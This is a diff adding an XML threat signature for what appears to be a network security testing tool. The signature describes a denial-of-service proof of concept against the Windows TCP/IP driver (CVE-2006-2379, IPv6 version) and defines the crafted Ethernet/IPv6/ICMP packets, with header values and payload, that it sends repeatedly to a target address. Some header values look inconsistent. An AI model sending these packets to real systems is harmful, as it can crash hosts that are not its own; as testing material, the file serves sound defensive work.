@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Windows TCP/IP Protocol Driver Remote Buffer Overflow Vulnerability (DoS POC) (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends a crafted ICMP packet which causes a buffer overflow condition in the Windows TCP/IP Protocol driver, This threat is based on an early proof of concept based on the windows traceroute utility. This threat is ICMP based, and requires no port number. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="ICMP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Operating_System"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_XP_SP2"/>
+      <item value="Microsoft_Windows_NT4_SP6"/>
+      <item value="Microsoft_Windows_2000_SP4"/>
+      <item value="Microsoft_Windows_2003"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/1967"/>
+    <CVEID display="true" value="CVE-2006-2379"/>
+    <bugtraqID display="true" value="18374"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="ed85f8a46f29eeb8c182793295ece8fc" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="false"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="cc"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1219869194"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1152158915" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="G">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="H">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="I">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <Output index="G" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <ICMP Type="" Code="" Checksum="" Identifier="" SequenceNumber="" Pointer="" unused3Byte="" Unused4Byte="" GatewayInternetAddress="" Payload="00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <ICMP Type="" Code="" Checksum="" Identifier="" SequenceNumber="" Pointer="" unused3Byte="" Unused4Byte="" GatewayInternetAddress="" Payload="00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="I" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <ICMP Type="" Code="" Checksum="" Identifier="" SequenceNumber="" Pointer="" unused3Byte="" Unused4Byte="" GatewayInternetAddress="" Payload="00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
